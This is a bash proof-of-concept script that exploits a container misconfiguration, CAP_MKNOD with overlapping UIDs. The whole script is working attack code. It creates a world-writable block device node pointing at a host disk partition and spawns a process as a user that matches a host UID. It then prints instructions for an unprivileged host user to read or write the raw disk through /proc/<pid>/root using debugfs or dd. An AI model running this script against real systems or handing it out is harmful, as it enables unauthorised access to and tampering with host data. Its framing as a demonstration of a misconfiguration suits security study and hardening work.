#!/usr/bin/env bash
#
# CAP_MKNOD_container.sh
#
# PoC script demonstrating how to:
#   1) Check for CAP_MKNOD in the container.
#   2) Create a block device node (/HARDDISK) with the provided major/minor.
#   3) Ensure there's a user with the same UID as on the host.
#   4) Spawn a process as that user.
#
# Usage:
#   ./CAP_MKNOD_container.sh <MAJOR> <MINOR> <HOST_UID> <USERNAME>
#
# Example:
#   ./CAP_MKNOD_container.sh 259 2 1002 useronhost
#     -> Creates /HARDDISK for device major=259, minor=2
#        Ensures a user with UID=1002 exists, spawns 'sleep 600'
#


set -euo pipefail

# ------------------------------------------------
# 1) Parse arguments
# ------------------------------------------------
if [[ $# -lt 4 ]]; then
  echo "Usage: $0 <MAJOR> <MINOR> <HOST_UID> <USERNAME>"
  echo
  echo "Example: $0 259 2 1002 useronhost"
  echo
  echo "Before running, on the host run:"
  echo "  lsblk -o NAME,MAJ:MIN,FSTYPE,SIZE,MOUNTPOINT"
  echo "to find a partition that uses ext2/ext3/ext4 (for debugfs)."
  echo "Then pass those major/minor numbers here."
  exit 1
fi

MAJOR_ID="$1"
MINOR_ID="$2"
HOST_UID="$3"
USERNAME="$4"

HARDDISK_NAME="/HARDDISK"
PROCESS_COMMAND="sleep 600"

# ------------------------------------------------
# 2) Confirm we're root
# ------------------------------------------------
if [[ $EUID -ne 0 ]]; then
  echo "[-] Must run as root inside the container."
  exit 1
fi

# ------------------------------------------------
# 3) Check for CAP_MKNOD
# ------------------------------------------------
echo "[*] Checking CAP_MKNOD..."
HAS_CAP_MKNOD=false

if command -v capsh &>/dev/null; then
  # If capsh is available, check for 'cap_mknod' in the effective set
  CAP_OUTPUT="$(capsh --print)"
  if echo "$CAP_OUTPUT" | grep -q "cap_mknod"; then
    HAS_CAP_MKNOD=true
  fi
else
  # Fallback: parse /proc/self/status for 'CapEff' bit #27
  CAPEFF_LINE="$(grep -E '^CapEff:' /proc/self/status | awk '{print $2}' || true)"
  if [[ -n "$CAPEFF_LINE" ]]; then
    CAPEFF_DEC=$((16#$CAPEFF_LINE))
    if (( (CAPEFF_DEC & (1 << 27)) != 0 )); then
      HAS_CAP_MKNOD=true
    fi
  fi
fi

if ! $HAS_CAP_MKNOD; then
  echo "[-] This container does not have CAP_MKNOD."
  exit 1
fi

echo "[+] CAP_MKNOD is present."

# ------------------------------------------------
# 4) Create the block device node /HARDDISK
# ------------------------------------------------
if [[ -e "$HARDDISK_NAME" ]]; then
  echo "[!] $HARDDISK_NAME already exists. Removing it first..."
  rm -f "$HARDDISK_NAME"
fi

echo "[*] Creating $HARDDISK_NAME (major=$MAJOR_ID minor=$MINOR_ID)"
mknod "$HARDDISK_NAME" b "$MAJOR_ID" "$MINOR_ID"

echo "[*] Setting 777 permissions on $HARDDISK_NAME (DANGEROUS!)"
chmod 777 "$HARDDISK_NAME"

# ------------------------------------------------
# 5) Ensure a user with HOST_UID exists
# ------------------------------------------------
echo "[*] Ensuring a user with UID=$HOST_UID exists..."
CREATE_USER_CMD=""
if command -v adduser &>/dev/null; then
  CREATE_USER_CMD="adduser"
elif command -v useradd &>/dev/null; then
  CREATE_USER_CMD="useradd"
else
  echo "[-] Neither 'adduser' nor 'useradd' found. Install one of them."
  exit 1
fi

EXISTING_USERNAME="$(getent passwd "$HOST_UID" | cut -d: -f1 || true)"
if [[ -n "$EXISTING_USERNAME" ]]; then
  echo "    - Found user '$EXISTING_USERNAME' with UID=$HOST_UID. We'll use that."
  USERNAME="$EXISTING_USERNAME"
else
  echo "    - No existing user with UID=$HOST_UID. Creating '$USERNAME'..."
  if [[ "$CREATE_USER_CMD" == "adduser" ]]; then
    # Alpine vs Debian difference
    if [[ $(adduser --help 2>&1) =~ "-D" ]]; then
      # Alpine style
      adduser -u "$HOST_UID" -D "$USERNAME"
    else
      # Debian style
      adduser --uid "$HOST_UID" --disabled-password --gecos "" "$USERNAME"
    fi
  else
    # useradd
    useradd -u "$HOST_UID" -m -s /bin/bash "$USERNAME"
  fi
fi

# ------------------------------------------------
# 6) Spawn a background process as that user
# ------------------------------------------------
echo "[*] Spawning '$PROCESS_COMMAND' under user=$USERNAME (UID=$HOST_UID)..."
TARGET_PID=""
if command -v su &>/dev/null; then
  su - "$USERNAME" -c "$PROCESS_COMMAND" &
  TARGET_PID=$!
elif command -v sudo &>/dev/null; then
  sudo -u "$USERNAME" bash -c "$PROCESS_COMMAND" &
  TARGET_PID=$!
else
  echo "[-] Neither 'su' nor 'sudo' is available to drop privileges."
  exit 1
fi

sleep 1
if ! kill -0 "$TARGET_PID" &>/dev/null; then
  echo "[-] The background process didn't start (PID=$TARGET_PID)."
  exit 1
fi

echo "[+] Started '$PROCESS_COMMAND' with container PID=$TARGET_PID."

# ------------------------------------------------
# 7) Final info
# ------------------------------------------------
echo
echo "================================================================"
echo "[*] Next steps (on the host, as UID=$HOST_UID):"
echo "    1) Find the HOST PID of this container's background process."
echo "       e.g. 'docker top <container_id>' or 'ps aux | grep sleep'."
echo
echo "    2) Access the device: /proc/\${HOST_PID}/root$HARDDISK_NAME"
echo "       e.g. 'debugfs /proc/\${HOST_PID}/root$HARDDISK_NAME' if ext2/3/4."
echo "           or 'dd if=/proc/\${HOST_PID}/root$HARDDISK_NAME of=/tmp/dump.bin bs=4M'."
echo
echo "    3) This is the misconfiguration vulnerability: the unprivileged"
echo "       host user can read/write raw disk data if UIDs overlap."
echo "================================================================"

echo "[*] This process will remain for 10 minutes (sleep 600) or until killed."
echo "[*] Done."
